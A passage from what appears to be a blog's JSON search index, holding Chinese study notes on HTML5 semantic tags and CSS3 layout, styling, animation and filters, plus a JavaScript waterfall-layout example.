//定义元素为行内块级元素。\n这三个的区别只有三个，排列分式，设置宽高，默认宽度\nhtml语义\n语义化：使得页面可以很好的向浏览器和开发者描述其意义\n语义化的好处：\n方便开发团队的前期开发和后期维护，不只是作用于自己的开发团队，也方便其他国家的开发者能理解网页的结构；\n在css文件丢失的情况下，也能表示出好的内容结构和代码结构，方便用户阅读；\n方便辅助技术能更好的阅读或者转译网页，方便有障碍人士阅读；\n良好的结构和语义，可以提高搜索引擎爬虫的有效爬取；\n重点：用正确的标签做正确的事！！！\n要注意可以改变样式的标签不一定是有居于语义的\n在没有出现语义元素前，几乎都是使用div或者span，加类加id\n没有语义的元素最适合当容器使用了\n常用的非语义元素有\u0026lt;div\u0026gt;和\u0026lt;span\u0026gt;\r常用的语义元素有\u0026lt;header\u0026gt;和\u0026lt;footer\u0026gt;\r\u0026lt;header\u0026gt;：页眉，一般包括网站logo，主导航，搜索框等；\r\u0026lt;nav\u0026gt;：导航，链接；\r\u0026lt;main\u0026gt;：定义文章的主要内容，一个页面只能使用一次；\r\u0026lt;article\u0026gt;：定义一份独立的内容，脱离其他内容或者其他部分，独立于文档的其余部分；\r\u0026lt;section\u0026gt;：定义内容的节（段）；\r\u0026lt;footer\u0026gt;：页脚，一般包含版权信息或者链接等；\r\u0026lt;aside\u0026gt;：侧边栏，一般作为附属信息，例如导航索引，广告等；\rmeta viewport\nviewport 是指 web 页面上的可见区域\n\u0026lt;meta name=\u0026quot;viewport\u0026quot; content=\u0026quot;width=device-width, initial-scale=1.0\u0026quot;\u0026gt;\rdevice-width指设备的理想宽度,不同的设备 device-width 是不一样的\nnitial-scale=1.0 是指默认缩放大小是1，也就是默认不缩放\nmaximum-scale=1.0 是指最大缩放大小是1\n标签使用\u0026lt;和\u0026gt;括起来，例如\u0026lt;div\u0026gt;\nhtml标签大多都是成对出现的，分开始标签和结束标签，结束标签比开始标签多了个/\n例如： html不区分大小写。所以\u0026lt;DIV\u0026gt;和\u0026lt;div\u0026gt;作用一样。建议使用小写\n\u0026lt;!DOCTYPE html\u0026gt;声明这是一个html5文件，声明位于\u0026lt;html\u0026gt;前面\r\u0026lt;html\u0026gt; 标识HTML文档的开始\r\u0026lt;head\u0026gt;表明一些和html文档有关的信息，例如title\r\u0026lt;body\u0026gt;html文档的主体\r\u0026lt;!","title":"html5学习笔记"},{"content":"盒子模型\n盒模型在css中是用来封装html元素的，因为本质上来看像个盒子一样，所以叫盒模型或者盒子模型，术语叫box model\n外边距（margin）：一般用于控制同辈元素之间的间距\n边框（border）：在内边距和内容之外的边框\n内边距（padding）：内边框是用于控制内容的距离\n内容（content）：内容，一般为文本和图像\n例子：建立一个宽度为100px，10px的内边距，10px的外边距，10px的红色边框的盒子\ndiv{\rwidth: 100px;\rborde: 10px solid red;\rpadding: 10px;\rmargin: 10px;\r}\rtop，bottom，left，right分别代表了上，下，左，右\n或者padding: 上，右，下，左，只有一个数字就表示上，下，左，右都是这个数值\n有两个数值就是分别代表上下和左右，有三个数值表示上和左右和下\n这个盒子大小应该是内容的宽度+内边距+边框+外边距\n100+20+20+20=160\n两种盒模型\nIE 盒子模型（box-sizing content-box）（怪异盒模型）\nIE盒模型的width与height是content、padding和border的总和\n调用IE盒模型 box-sizing: border-box;\nW3C标准盒模型（box-sizing content-box）\n标准盒模型的width与height只含content，不包括padding和border\n调用W3C标准盒模型 box-sizing: content-box;\n在IE6，7，8浏览器中不声明DOCTYPE类型，那么在IE6，7，8浏览器中会将盒子模型解释为IE盒子模型\n如果在页面中声明了DOCTYPE类型，那么所有的浏览器都会把盒模型解释为W3C盒模型\nJavaScript获取盒模型的宽和高（这里的DOM不是指整个dom，而是某个元素）\nDOM.style.width和DOM.style.height（只能获取内联样式）\nDOM.currentStyle.width和DOM.currentStyle.height（只支持IE）\nwindow.getComputedStyle(DOM).width和window.getComputedStyle(DOM).height（兼容性好）\n获取元素相对于视窗的位置(top,right,bottom,left都可以获取)\nlet data = DOM.getBoundingClientRect() data.top\n有BFC特性的元素是一个被“隔离”的容器，该容器里面的元素不会在布局上影响到外面的元素\n满足下面其中一个条件就触发BFC特性\nbody 根元素\n浮动元素 float除none外的值\n绝对定位元素 position (absolute、fixed)\ndisplay 为 inline-block、table-cells、flex\noverflow 除了 visible 以外的值 (hidden、auto、scroll)\nBFC的特性：\nBFC是页面上的独立容器，该容器使用类型浮动之类会影响布局的元素都不会影响到外界的布局或者元素\n例子：\n1.当处于同一个BFC容器时，外边距会进行重叠，为了避免重叠，可以将其放在不同的BFC容器内\n2.当容器内的元素使用的浮动，将其脱离了文档流，要触发容器的BFC，那么BFC容器要包含使用了浮动的元素\n3.当第一个元素使用了浮动，希望第二个元素不被浮动元素影响，要在第二个元素上触发BFC特性\nflex为Flexible Box 的缩写，意为\u0026quot;弹性盒模型\u0026quot;，为其盒模型提供足够大的灵活性\ndiv{\rdisplay: flex;\r}\r使用flex布局的元素，被称为flex容器，该元素的所有子元素为该容器的成员，称为flex项目\nflex-direction\n一般用到四个值\nrow：在水平方向上，起点在左 row-reverse：在水平方向上，起点在右 column：在垂直方向上，起点在上。 column-reverse：在垂直方向上，起点在下。\nflex-wrap\n一般用到三个值\nnowrap：不换行 wrap：当容器宽度不足时换行，第一行在上方 wrap-reverse：当容器宽度不足时换行，第一行在下方\nflex-flow是flex-direction和flex-wrap简写版，它们两个的属性都可以使用 例如flex-flow: row-reverse wrap-reverse;\n表达了换行，第一行在下方，起点在右\njustify-content\n定义项目在主轴上的对齐方式\nflex-star：左对齐\nflex-end：右对齐\ncenter： 居中\nspace-between：两端对齐，每个项目之间的间隔都相等\nspace-around：每个项目两侧的间隔相等，所以项目之间的间隔比项目与边框的间隔大一倍\nalign-items\nflex-start：头部对齐 flex-end：底部对齐 center：居中对齐 baseline: 项目的第一行文字的基线对齐 stretch：当项目没有设置高度或设置为auto时，将占满整个容器的高度\nalign-content\nflex-start：元素位于容器的开头 flex-end：元素位于容器的结尾 center：元素位于容器的中心 space-between：元素位于各行之间留有空白的容器内 space-around：元素位于各行之前、之间、之后都留有空白的容器内 stretch：默认值，元素被拉伸以适应容器\n单独用于元素的属性\norder 控制元素的顺序，数值越小排列就越靠前\norder:1\nflex-grow 控制元素的宽度\n如果都为1，还有剩余的空间，那么将会等分剩余的空间\n如果有一个为2，那么为2所占的剩余空间比为1的大1倍\nflex-grow: 2\nflex-shrink 控制元素宽度\n如果都为1时，当空间不足时，将会等比例缩小\n如果有一个为2时，那么当空间不足时\nflex-shrink: 2\nflex-basis 控制元素的初始宽度\n\\flex-basis: 100px flex 控制元素都有相同的宽度，不会被内容的长度撑开 \\flex: 1 align-self 控制元素单独对齐方式\nalign-self: auto | flex-start | flex-end | center | baseline | stretch;\n背景\n定位\n在box盒子内部的背景默认是在盒子的内边距的左上角对齐\nbackground-origin属性则规定background是相对于什么位置来定位的\n.box{\rwidth: 300px;\rheight: 300px;\rpadding: 10px;\rmargin: 10px;\rbackground: url(\u0026quot;hallo.jpg\u0026quot;);\rbackground-origin: padding-box;\r}\rbackground-origin属性值有3个，padding-box：相对于内边距定位，border-box：相对于边框定位，content-box：相对于内容区域\n裁切\n.box{\rwidth: 300px;\rheight: 300px;\rpadding: 10px;\rmargin: 10px;\rbackground: url(\u0026quot;hallo.jpg\u0026quot;);\rbackground-clip: padding-box;\r}\rbackground-clip属性提供相对于什么位置进行背景裁切，该属性值和background-origin一样\n背景尺寸\n.box{\rwidth: 300px;\rheight: 300px;\rpadding: 10px;\rmargin: 10px;\rbackground: url(\u0026quot;hallo.jpg\u0026quot;);\rbackground-size: 100px 100px;\r}\rbackground-size属性可以直接指定大小，也是可以cover或者contain填充\ncover会按照原来的缩放比来填满整个盒子，而contain是按照原来缩放比，完整的填充盒子（不会填满）\n边框\n边框阴影\n.box{\rwidth: 300px;\rheight: 300px;\rborder: 1px solid red;\rbox-shadow: 0px 0px 6px #ccc;\rborder-radius: 6px;\r}\rbox-shadow，第一个值为阴影在水平方向的偏移量（正数为正方向，负数为反方向）\n第二个值为阴影在垂直方向的偏移量（正数为朝下，负数为朝上）\n第三个值为阴影的模糊度\n第四个值为阴影的颜色\nborder-radius为边框圆角\n边框图片\n.box{\rwidth: 300px;\rheight: 300px;\rborder: 1px solid red;\rborder-image-source: url(\u0026quot;hallo.jpg\u0026quot;); // 边框图片\rborder-image-slice: 10; // 边框图片向内的偏移量\rborder-image-repeat: round; // 边框图片的平铺方式\rborder-image-width: 10px; // 边框图片的宽度\r}\rborder-image-repeat有4个常用值\nstretch（默认值）：拉伸图形来填充\nrepeat：平铺（重复）图形来填充\nround：如果无法完整平铺，那么就进行缩放来适应\nspace：如果无法完整平铺，那么就进行扩展来适应\n文本阴影\ntext-shadow，有4个值，分别是水平方向的偏移量，垂直方向的偏移量，模糊度，阴影的颜色\n伪类选择器\n:first-child：选择父元素中的第一个子元素 :last-child：选择父元素中的最后一个子元素 :nth-child(n) ：选择父元素中正数第n个子元素 :nth-last-child(n) ：选择父元素中倒数第n个子元素\nn的值必须要大于等于0，也可以是表达式\n:target：选择被锚链接指向 ::selection：选择被鼠标选中\n例如：\n:target{\rbackground-color: #ccc;\r}\r\u0026lt;p\u0026gt;\\\u0026lt;a href=\u0026quot;#a\u0026quot;\u0026gt;跳转至1\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;\r\u0026hellip;\n\u0026lt;p id=\u0026quot;a\u0026quot;\u0026gt;1\u0026lt;/p\u0026gt;\r或者\np::selection:{\rbackground-color: #ccc;\r}\r\u0026lt;p\u0026gt;xxx\u0026lt;/p\u0026gt;\r\u0026hellip;\n\u0026lt;p\u0026gt;xxx\u0026lt;/p\u0026gt;\r::first-line：选择第一行 ::first-letter：选择第一个字符\n例如：\ndiv{\rwidth: 100px;\rheight: 100px;\r}\rdiv::first-line{\rbackground-color: #ccc;\r}\rdiv::first-letter{\rbackground-color: #000;\r}\r\u0026lt;div\u0026gt;\rsjdasfkdskbdsalkddsfjdslsakfbsdlss\rxxx\rtest\r\u0026lt;/div\u0026gt;\r过渡\n.box1 {\rwidth: 300px;\rheight: 300px;\rbackground-color: red;\rtransition-property: all; transition-duration: 3s;\r}\r.box1:hover {\rwidth: 500px;\rheight: 500px;\rbackground-color: #ccc;\r}\rtransition-property：表示哪些属性要参与到过渡动画效果，all表示全部\ntransition-duration：表示过渡执行时间\ntransition-delay: 设置过渡执行前等待的时间\ntransition-timing-function：过渡的速度类型，linear为相同速度，ease为开始慢速，变快，然后慢速结束，ease-in慢速开始，ease-out慢速结束，ease-in-out以慢速开始和结束，cubic-bezier开始到结束的不同速度过渡，用小数来表示进度，例如cubic-bezier(0.1, 0.3, 0.6, 0.1)\nCSS3 border-image\nborder-image可以在元素的边框上绘制图像，规范要求使用borde-images时边框样式必须存在\nborder-image: url(./logo.jpg) 10 repeat\n上面这行代表使用图片logo.jpg，裁剪位置10，使用重复方式\n图片：使用url()调用，路径可以是绝对或者相对，也可以不用图片，即none\n裁剪位置：默认单位为px，10表示10px，不需要写单位\n支持使用百分百，例如300px*100px的图片，30%就是裁剪图片90px*30px的四个边的大小 也可以使用4个数，代表上右下左要裁剪的数值\n重复方式只是其中一种方式，可以用于设置图像边界是否要重复或者拉伸，铺满\n重复（repeat)，拉伸（stretch）,平铺（round）\nstretch（拉伸）为默认值，所以会裁剪出来的图片比边框小，就会拉伸，以保证填满边框\n可以使用两个参数，当使用一个参数时，水平方向以及垂直方向都使用这个参数\n当使用两个参数时，第一个参数代表水平方向，第二个参数表示垂直方向\nborder-image还有4个子属性\n指定要用于绘制边框的图像的位置\nborder-image-source\n图像边界向内收缩\nborder-image-slice\n图像边界的宽度\n可以使用带单位的，百分百，不带单位的（倍数），auto\nborder-image-width\n指定在边框外部绘制 border-image-area 的量\n就是原本的位置向外拉伸\nborder-image-outset\n用于设置图像边界是否要重复或者拉伸，铺满\nborder-image-repeat\n引入css 内联css： // 要写在开始标签中\n嵌入css： div{color: #fff;}\n外部css: 优先级：内联 \u0026gt; 嵌入 \u0026gt; 外部\n选择器\n标签选择器：div{}\rid选择器：#main{} \u0026lt;div id=\u0026quot;main\u0026quot;\u0026gt;\r类选择器：.main{} \u0026lt;div class = \u0026quot;main\u0026quot;\u0026gt;\r子选择器：.main\u0026gt;div{}\r后代选择器：.main div{}\r通用选择器：*{}\r伪类选择器：a:{}\r分组选择器：div,span{}\rid选择器只能在文档中使用一次，类选择器可以使用多次\n选择器的优先级是: 内联 \u0026gt; id \u0026gt; 类 \u0026gt; 标签 \u0026gt; 通配符\n标签的权值为1\n类选择器的权值为10\nID选择器的权值为100\n伪类选择器是10\n权值越大，优先级就越大\n优先级最大的!important,例如：\ndiv{color:#fff!important;}\n样式\n字体font-family div{font-family:\u0026ldquo;Microsoft Yahei\u0026rdquo;;}\n字体大小font-size div{font-size:16px;}\n字体粗细font-weight div{font-weight:bold;}\n字体样式font-style div{font-style:normal;}\n字体颜色color div{color:#fff;}\n文本样式text-decoration div{text-decoration:none;}\n文本首行缩进text-indent div{text-indent:2em;}\n文本行间间距line-height div{line-height:2em;}\n增加或减少每一个文字的间距 letter-spacing div{letter-spacing:10px;}\n增加或减少每个英文单词之间的间距word-spacing div{word-spacing:10px;}\n文本对齐方式text-align div{text-align:center;}\n定位： 定位有两种，绝对定位和相当定位\n相对定位和绝对定位都有四个属性\nleft（左），top(头)，right（右），bottom（底）\n绝对定位：\n设置绝对定位的元素会脱离文档流，所以不会占用空间\ndiv{\rposition: absolute;\r}\r绝对定位的元素的位置相对于元素最近的已定位的祖先元素，如果没有，那么相对于最初的包含块（也就是body）\n相对定位：\n相对定位的元素的位置相对于元素最初的位置，使用相对定位时，元素会占据原来的空间，所以，移动元素会覆盖其他元素\ndiv{\rposition: relative;\r}\rcss有下面这些选择器\nid选择器（#myid） 类选择器（.myclassname） 标签选择器（div,h1,p） 后代选择器（h1p） 相邻后代选择器（子）选择器（ul\u0026gt;li） 兄弟选择器（li~a） 相邻兄弟选择器（li+a） 属性选择器（a[rel=\u0026ldquo;external\u0026rdquo;]） 伪类选择器（a:hover,li:nth-child） 伪元素选择器（::before、::after） 通配符选择器（*）\n在css3中使用单冒号来表示伪类，用双冒号来表示伪元素\n伪类一般用于匹配元素的一些状态，而伪元素一般用于匹配元素的位置\nCSS3 圆角\n使用border-radius属性\n可以使用1——4个值\n1个值，表示四个角都使用这个值\n2个值，表示第一个值对应左上和右下，第二个值对应左下和右上\n3个值，表示第一个值对应左上，第二个值对应左下和右上，第三个值表示右下\n4个值，表示第一个值对应左上，第二个值对应右上，第三个值表示右下，第四个值表示左下\n单独设置圆角\n左上角 border-top-left-radius 右上角\tborder-top-right-radius\n右下角 border-bottom-right-radius 左下角 border-bottom-left-radius\ncss阴影\nbox-shadow: 10px 10px 10px #fff;\n第一个值是阴影水平位移，第二个值为阴影垂直位移，第三个值为模糊半径\n第四个值为阴影颜色\ntransition属性 例如: div{ width: 100px; height: 100px; background: #000; transition: width 1s; } div:hover{ background: #f6f6f6; }\nz-index属性\n该属性用于堆叠元素的顺序，高级的元素会堆叠在低级的元素前面，例如：\n#app{\rz-index: -1;\r}\rfont-family属性\n该属性用于设置元素字体，可以设置多个字体，当第一个字体不支持时，自动尝试设置下一个字体\n@keyframes 规则：这个规则是可以将样式以动画方式（特定时间）逐渐地从当前样式修改为新的样式，当超过特定时间又恢复原来的样式\n#app{\rwidth: 100px;\rheight: 100px;\rbackground-color: #000;\ranimation-name: test;\ranimation-duration: 6s;\ranimation-delay: 3s;\ranimation-iteration-count: infinite;\r}\r@keyframes test {\rfrom{\rbackground-color: #000;\r}\rto{\rbackground-color: #ccc;\r}\r}\rbackground-image\n该属性可以添加背景，可以添加多张背景，例如：\n#app{\rbackground-image: url(1.jpg),url(2.jpg);\rbackground-position: left top,right bottom;\rbackground-repeat: no-repeat,repeat;\r}\rbackground-size\n该属性可以指定背景的大小，例如： #app{ background-image: url(1.jpg); background-repeat: no-repeat; background-size: 100px 100px; }\nbackground-origin\n该属性可以指定背景的位置区域（外边框（border-box），内边框（padding-box），内容区（content-box）），例如：\nbackground-color: content-box;\rbackground-clip\n该属性可以将背景裁剪到指定位置（外边框（border-box），内边框（padding-box），内容区（content-box），例如：\nbackground-clip: content-box;\r渐变分为线性渐变（直线）和径向渐变（中心）\n线性渐变（默认从上到下）\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-image: linear-gradient(#ccc,#000);\r}\r从左到右\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-image: linear-gradient(to right ,#ccc,#000);\r}\r从左上角到右下角\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-image: linear-gradient(to right bottom ,#ccc,#000);\r}\r带角度的（不能指定方向）\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-image: linear-gradient(30deg,#ccc,#000);\r}\r带透明度的\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-image: linear-gradient(30deg,rgb(255,0,0,1),rgb(0,0,0,0));\r}\r带重复的\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-image: repeating-linear-gradient(#ccc, #fcfcfc 20%, #000 30%);\r}\r径向渐变\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-image: radial-gradient(#fff, #ccc, #000,#fc0000);\r}\r必须要有两个以上的颜色，第一个颜色在中间，依次往外排\n同样可以设置每个颜色的占比\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-image: radial-gradient(#fff 10%, #ccc 20%, #000 30%,#fc0000 40%);\r}\r当元素是不正的，那么径向渐变默认就是椭圆的（ellipse），也可以指定为圆形的（circle）\n#app{\rwidth: 300px;\rheight: 250px;\rbackground-image: radial-gradient(circle,#fff, #ccc, #000,#fc0000);\r}\r还提供了定义渐变大小的关键字，分别是closest-side，farthest-side，closest-corner，farthest-corner\n当然也提供了可以重复渐变的，例如：\n#app{\rwidth: 300px;\rheight: 250px;\rbackground-image: repeating-radial-gradient(circle,#000 20%, #fc0000 30% , yellow 50%);\r}\r文本阴影\n#app{\rtext-shadow: 5px 5px 5px #000;\r}\r值分别为水平阴影，垂直阴影，模糊度，阴影颜色\n元素盒子阴影\n#app{\rbox-shadow: 5px 5px 5px #000;\r}\r容器文本溢出处理\n#app{\rtext-overflow: ellipsis;\r}\r文本溢出默认为text-overflow: clip\n自动强制文本换行（当单词或者某个文本太长，就会强制换行，避免文本溢出）\n#app{\rword-wrap: break-word;\r}\r@font-face 规则\n该规则允许使用客户端没有的字体，例如：\n@font-face {\rfont-family: hallo;\rsrc: url(\u0026quot;hallo.ttf\u0026quot;);\r}\rdiv{\rfont-family: hallo;\r}\r必需属性font-family：字体名称\nsrc：字体文件的url\n在需要用字体的元素上font-family: 字体名称\n过渡动画，会逐渐式加载样式，例如\n#app{\rwidth: 100px;\rheight: 100px;\rbackground-color: #333;\rtransition: height 3s,width 3s,transform 3s;\r}\r#app:hover{\rwidth: 300px;\rheight: 300px;\rtransform: rotate(360deg);\r}\r当鼠标移动到该元素上，那么会在3秒内逐渐转换为指定样式，移开鼠标那么又会逐渐恢复原来的样式\ncolumn-count 属性，该属性可以将元素中的文本分成指定列，例如\n#app{\rcolumn-count: 3;\r}\r每个列之间的距离使用column-gap属性指定，例如\n#app{\rcolumn-count: 3;\rcolumn-gap: 20px;\r}\rcolumn-rule-style属性可以指定每个列分隔的边框样式，例如下面样式为实线\n#app{\rcolumn-count: 3;\rcolumn-gap: 20px;\rcolumn-rule-style: solid;\r}\rcolumn-rule-width属性可以指定列的边框之间的宽度，例如\n#app{\rcolumn-count: 3;\rcolumn-gap: 20px;\rcolumn-rule-style: solid;\rcolumn-rule-width: 1px;\r}\rcolumn-rule-color属性可以指定列的边框的颜色，例如：\n#app{\rcolumn-count: 3;\rcolumn-gap: 20px;\rcolumn-rule-style: solid;\rcolumn-rule-width: 6px;\rcolumn-rule-color: #000;\r}\r当然列的边框的样式可以缩写，例如：\n#app{\rcolumn-rule: 6px solid #000;\r}\r如果在父元素内，某个子元素不想被分列影响，直接指定子元素，例如\ndiv{\rcolumn-span: all;\r}\rcolumn-width可以指定列的宽度，例如\ndiv{\rcolumn-width: 300px;\r}\rcolumn-gap属性和column-width属性之间的区别，就是column-gap控制的是列与列之间的距离，而column-width控制的却是列本身的宽度\n动画，可以指定时间，在指定时间内逐渐成另一种样式，可以指定动画的过程的样式，例如\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-color:#ccc;\ranimation: hallo 5s;\r}\r@keyframes hallo{\r0% {background-color: #ccc;}\r25% {background-color: #fff;}\r50% {background-color: #222;}\r75% {background-color: #f3f3f3}\r100% {background-color: #777;}\r}\r0%为动画开始，100%为动画结束，当动画结束时样式会恢复原来定义的样式，除了用百分比表示进度，也可以用from（起点）和to（终点）表示\n能修改颜色，当然也能修改位置，例如：\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-color:#ccc;\ranimation: hallo 5s;\rposition: relative;\r}\r@keyframes hallo{\r0% {\rbackground-color: #ccc;\rtop: 0px;\rleft: 0px;\r}\r25% {\rbackground-color: #fff;\rtop: 0px;\rleft: 300px;\r}\r50% {\rbackground-color: #222;\rtop: 300px;\rleft: 300px;\r}\r75% {\rbackground-color: #f3f3f3;\rtop: 300px;\rleft: 0px;\r}\r100%{\rbackground-color: #777;\rtop: 0px;\rleft: 0px;\r}\r}\r二维改变样式\n旋转（值为正数则顺时针转，值为负数则逆时针转）\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-color: #ccc;\rtransform: rotate(60deg);\r}\r平移(根据x（左），y（上）轴决定)\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-color: #ccc;\rtransform: translate(100px,100px);\r}\r放大或者缩小\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-color: #ccc;\rtransform: scale(2,2);\r}\r宽度和高度是原来的2倍\n倾斜(根据x（水平），y（垂直）轴决定，默认为0，值为负数则逆时针转)\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-color: #ccc;\rtransform: skew(10deg,30deg);\r}\r同样也可以缩写为一个属性\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-color:#ccc;\rtransform:matrix(0.6,1.5,-0.5,1.2,3,3);\r}\r这个6个值分别代表旋转，放大或者缩小，平移，倾斜\n三维改变样式\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-color:#ccc;\rtransform: rotateX(60deg);\r}\r#app{\rwidth: 300px;\rheight: 300px;\rbackground-color:#ccc;\rtransform: rotateY(60deg);\r}\r#app{\rwidth: 300px;\rheight: 300px;\rbackground-color:#ccc;\rtransform: rotateZ(60deg);\r}\r旋转元素的起始位置\n#app{\rwidth: 300px;\rheight: 300px;\rbackground-color:#ccc;\rtransform: rotate(60deg);\rtransform-origin: 30% 60%;\r}\r拓展\n#app{\rwidth: 500px;\rheight: 500px;\rperspective: 200;\rperspective-origin: 10% 20%;\rbackground-color: #000;\r}\r#app div{\rwidth: 300px;\rheight: 300px;\rbackground-color:#ccc;\rtransform: rotateX(60deg);\rtransform-style: preserve-3d;\rbackface-visibility: hidden;\r}\rbackface-visibility属性用于指定背面是否显示\nperspective-origin属性用于改变底部位置\nperspective属性用于查看透视图（z只支持3D元素）\ntransform-style属性用于是否保留3d位置保留\ncss强制换行，避免文本溢出容器\nwhite-space: pre-wrap;\rnormal：默认，空白被忽略\nnowrap：文本不换行，文本在同一行继续\npre：保留空格，换行保留，不自动换行\npre-wrap：保留完整空格，保留换行符，自动换行\npre-line：保留空格（可能不完整），保留换行\nfilter属性滤镜\n该属性默认值为none\n背景为黑白\nfilter: grayscale(100%);\r高斯模糊\nfilter: blur(3px);\r亮度\nfilter: brightness(160%);\r对比度\nfilter: contrast(160%);\r透明度\nfilter: opacity(30%);\r饱和度\nfilter: saturate(300%);\r阴影\nfilter: drop-shadow(5px 5px 6px #ccc);\r色相旋转\nfilter: hue-rotate(30deg);\r颠倒输入\nfilter: invert(30%);\r允许使用多个滤镜，多个滤镜有空格分开\n表格布局（现在很少用，一般都是用div+css）\n该元素会作为块级表格（例如table标签，有换行） display: table;\n内联表格（没换行） display: inline-table;\n表格行（例如tr） display: table-row;\n表格单元格（例如td） display: table-cell;\n表格标题 display: table-caption;\n单元格列 display: table-column;\n","permalink":"https://99999.fun/posts/11/","summary":"盒子模型\n盒模型在css中是用来封装html元素的，因为本质上来看像个盒子一样，所以叫盒模型或者盒子模型，术语叫box model\n外边距（margin）：一般用于控制同辈元素之间的间距\n边框（border）：在内边距和内容之外的边框\n内边距（padding）：内边框是用于控制内容的距离\n内容（content）：内容，一般为文本和图像\n例子：建立一个宽度为100px，10px的内边距，10px的外边距，10px的红色边框的盒子\ndiv{\rwidth: 100px;\rborde: 10px solid red;\rpadding: 10px;\rmargin: 10px;\r}\rtop，bottom，left，right分别代表了上，下，左，右\n或者padding: 上，右，下，左，只有一个数字就表示上，下，左，右都是这个数值\n有两个数值就是分别代表上下和左右，有三个数值表示上和左右和下\n这个盒子大小应该是内容的宽度+内边距+边框+外边距\n100+20+20+20=160\n两种盒模型\nIE 盒子模型（box-sizing content-box）（怪异盒模型）\nIE盒模型的width与height是content、padding和border的总和\n调用IE盒模型 box-sizing: border-box;\nW3C标准盒模型（box-sizing content-box）\n标准盒模型的width与height只含content，不包括padding和border\n调用W3C标准盒模型 box-sizing: content-box;\n在IE6，7，8浏览器中不声明DOCTYPE类型，那么在IE6，7，8浏览器中会将盒子模型解释为IE盒子模型\n如果在页面中声明了DOCTYPE类型，那么所有的浏览器都会把盒模型解释为W3C盒模型\nJavaScript获取盒模型的宽和高（这里的DOM不是指整个dom，而是某个元素）\nDOM.style.width和DOM.style.height（只能获取内联样式）\nDOM.currentStyle.width和DOM.currentStyle.height（只支持IE）\nwindow.getComputedStyle(DOM).width和window.getComputedStyle(DOM).height（兼容性好）\n获取元素相对于视窗的位置(top,right,bottom,left都可以获取)\nlet data = DOM.getBoundingClientRect() data.top\n有BFC特性的元素是一个被“隔离”的容器，该容器里面的元素不会在布局上影响到外面的元素\n满足下面其中一个条件就触发BFC特性\nbody 根元素\n浮动元素 float除none外的值\n绝对定位元素 position (absolute、fixed)\ndisplay 为 inline-block、table-cells、flex\noverflow 除了 visible 以外的值 (hidden、auto、scroll)\nBFC的特性：","title":"css3学习笔记"},{"content":"瀑布流的特点就是容器等宽不等高，计算其高度，选择最矮的一个容器的下面将插入第二行的第一个容器，以此类推，因此容器需要设置为绝对定位\n首先需要确定一行有多少列，列数 = 页面的宽度 / 容器的宽度\n获取页面的宽度：window.innerWidth或者document.documentElement.clientWidth或者document.body.clientWidth\n获取页面的高度：window.innerHeight或者document.documentElement.clientHeight或者document.body.clientHeight\n页面宽度：.width，容器宽度：.offsetWidth\n得到了列数后，还需要得到全部容器的高度，因此还需要用到数组，用来存储容器的高度\n遍历全部容器，还需要判断是否到了第二行，i\u0026lt;列数\n而第一行的全部容器，设置头部和左边定位，左边定位设置为容器的宽度*i，保证不会被覆盖或者溢出，同时将arr[i].offsetWidth传入新的数组中\n然后找到上一行最矮的容器，只需要将全部得到的容器的宽度判断一下就可以，首先假释一下第一个容器就是最矮的，当遍历的容器小于该容器时，那么将该容器设置为当前遍历的容器，而当前遍历的i就是最矮的容器索引值\n然后就设置下一行的容器的位置就可以了，头部：最矮的容器的高度，左边：最矮的容器距离页面最左边的宽度\n因为已经设置了下一行的容器，因此还需要重新获取一下当前容器的高度，当前容器高度 = 当前容器高度+间隙 +拼接过来的容器的高度\n为了体验更好，可以将上面操作封装到一个函数中，当网页加载完毕加执行（window.onload），当页面宽度高度发送变化时也执行(window.onresize)\n例如：\nvar data = document.getElementsByClassName('imgs');\rfunction datamain(){\rvar datawidtha = window.innerWidth;\rvar datawidthb = Math.floor(data[0].offsetWidth);\rvar dataab = Math.floor(datawidtha/datawidthb);\rvar ints = Math.floor((datawidtha - dataab*datawidthb)/(dataab+1))\rvar arr = [];\rfor(var i=0;i\u0026lt;data.length;i++){\rif(i\u0026lt;dataab){\rdata[i].style.top = 0;\rdata[i].style.left = (datawidthb+ints) * i + \u0026quot;px\u0026quot;;\rarr.push(data[i].offsetHeight);\r}else{\rvar datamin = arr[0];\rvar index = 0;\rfor(var a = 0; a\u0026lt;arr.length; a++){\rif(datamin \u0026gt; arr[a]){\rdatamin = arr[a];\rindex = a;\r}\r}\rdata[i].style.top = arr[index]+ ints +\u0026quot;px\u0026quot;;\rdata[i].style.left = data[index].offsetLeft + \u0026quot;px\u0026quot;;\rarr[index] = arr[index] + data[i].offsetHeight + ints;\r}\r}\r}\rwindow.onload = function () {\rdatamain();\r}\rwindow.onresize = function () {\rdatamain();\r} ","permalink":"https://99999.fun/posts/10/","summary":"瀑布流的特点就是容器等宽不等高，计算其高度，选择最矮的一个容器的下面将插入第二行的第一个容器，以此类推，因此容器需要设置为绝对定位\n首先需要确定一行有多少列，列数 = 页面的宽度 / 容器的宽度\n获取页面的宽度：window.innerWidth或者document.documentElement.clientWidth或者document.body.clientWidth\n获取页面的高度：window.innerHeight或者document.documentElement.clientHeight或者document.body.clientHeight\n页面宽度：.width，容器宽度：.offsetWidth\n得到了列数后，还需要得到全部容器的高度，因此还需要用到数组，用来存储容器的高度\n遍历全部容器，还需要判断是否到了第二行，i\u0026lt;列数\n而第一行的全部容器，设置头部和左边定位，左边定位设置为容器的宽度*i，保证不会被覆盖或者溢出，同时将arr[i].offsetWidth传入新的数组中\n然后找到上一行最矮的容器，只需要将全部得到的容器的宽度判断一下就可以，首先假释一下第一个容器就是最矮的，当遍历的容器小于该容器时，那么将该容器设置为当前遍历的容器，而当前遍历的i就是最矮的容器索引值\n然后就设置下一行的容器的位置就可以了，头部：最矮的容器的高度，左边：最矮的容器距离页面最左边的宽度\n因为已经设置了下一行的容器，因此还需要重新获取一下当前容器的高度，当前容器高度 = 当前容器高度+间隙 